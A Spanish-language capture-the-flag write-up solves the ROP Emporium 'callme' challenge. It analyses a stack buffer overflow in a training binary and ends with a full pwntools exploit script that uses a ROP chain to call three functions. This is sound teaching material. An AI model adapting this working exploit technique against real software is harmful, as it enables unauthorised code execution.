callme

Se nos proporciona un binario llamado callme con las siguientes protecciones.

$ checksec callme
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No

Tambien viene con la libreria compartida libcallme.so y la flag encriptada.

$ ls
callme encrypted_flag.dat key2.dat key1.dat libcallme.so

Estos archivos adicionales al binario pueden ser ignorados, ya que su propósito es garantizar que las funciones se ejecuten en el orden correcto y que la cadena ROP se construya adecuadamente.

Al ejecutar el binario nos muestra Hope you read the instructions... por pantalla, si ingresamos cualquier cosa sale del binario diciendo Thank you!.

$ ./callme 
callme by ROP Emporium
x86_64

Hope you read the instructions...

> test
Thank you!

Utilizaremos IDA para decompilar las funciones, al ver la funcion main vemos que llama a la funcion pwnme.

int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("callme by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
}

La función pwnme() define un buffer de 32 bytes y utiliza read() para aceptar hasta 512 bytes de entrada (0x200 en hexadecimal). Esto hace que el binario sea vulnerable a un Buffer Overflow, ya que permite ingresar más datos de los que el buffer puede almacenar, desbordándolo.

int pwnme()
{
  _BYTE s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 0x200uLL);
  return puts("Thank you!");
}

Para comprobar de que es vulnerable a Buffer Overflow podemos ejecutarlo e ingresar varios caracteres.

Vemos que da un error de segmentation fault, confirmando que existe una corrupcion de memoria.

Si seguimos analizando el codigo fuente del programa vamos a ver una funcion usefulFunction que llama a tres funciones callme_one, callme_two, callme_three con tres argumentos.

void usefulFunction(void)

{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

Al revisar la descripcion del reto nos dicen que debemos llamar a estas tres funciones con los argumentos 0xdeadbeefdeadbeef, 0xcafebabecafebabe y 0xd00df00dd00df00d. Con esto podremos resolver el desafio.

Con esto queda claro que el desafío requiere el uso de Return Oriented Programming (ROP). Con NX habilitado, la pila no es ejecutable, lo que nos obliga a construir cadenas ROP para ejecutar código arbitrario. Para pasar argumentos a las funciones, utilizaremos gadgets, los cuales extraeremos empleando herramientas como ropper.

Vamos a extraer los gadgets necesarios, al filtrar por pop podemos ver un gadget que nos sirve que es pop rdi; pop rsi; pop rdx; ret; ,

Este gadget nos permite cargar los tres argumentos necesarios para la función y enviar una instrucción ret, asegurando que la ejecución continúe con la siguiente instrucción en la pila. Esto será fundamental para construir nuestra cadena ROP.

Entonces el enfoque es el siguiente: primero explotaremos el Buffer Overflow para desbordar el buffer. Luego, utilizaremos el gadget pop rdi; pop rsi; pop rdx; ret;, cargaremos los argumentos correspondientes, y llamaremos a la función callme_one. Repetiremos el proceso de manera secuencial hasta ejecutar callme_three. Antes de avanzar, lo primero será calcular el offset necesario para desbordar el buffer, para esto utilizaremos gdb.

Necesitamos 40 bytes para alcanzar el punto de retorno. Con esto, podemos comenzar a construir el exploit. Primero, crearemos una variable junk con los 40 bytes de relleno. A partir de ahí, armaremos el payload añadiendo un gadget ret para alinear la pila, seguido del gadget pop rdi; pop rsi; pop rdx; ret; , los argumentos necesarios, y finalmente la llamada a callme_one. Repetiremos el proceso para callme_two y callme_three. Una vez construido, enviamos el payload y resolvemos el desafío. Este es el exploit final.

from pwn import *

context.binary = ELF('./callme', checksec=False)
p = process()

# padding
offset = 40
junk = b'A' * offset

# gadgets
RET = 0x00000000004006be
POP_RDI_POP_RSI_POP_RDX_RET = 0x000000000040093c

#functions
callme_one = 0x0000000000400720
callme_two = 0x0000000000400740
callme_three = 0x00000000004006f0

# arguments
arguments = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

# payload
payload = junk
payload += p64(RET)
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET)
payload += arguments
payload += p64(callme_one)
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET)
payload += arguments
payload += p64(callme_two)
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET)
payload += arguments
payload += p64(callme_three)


p.sendline(payload)
p.interactive()
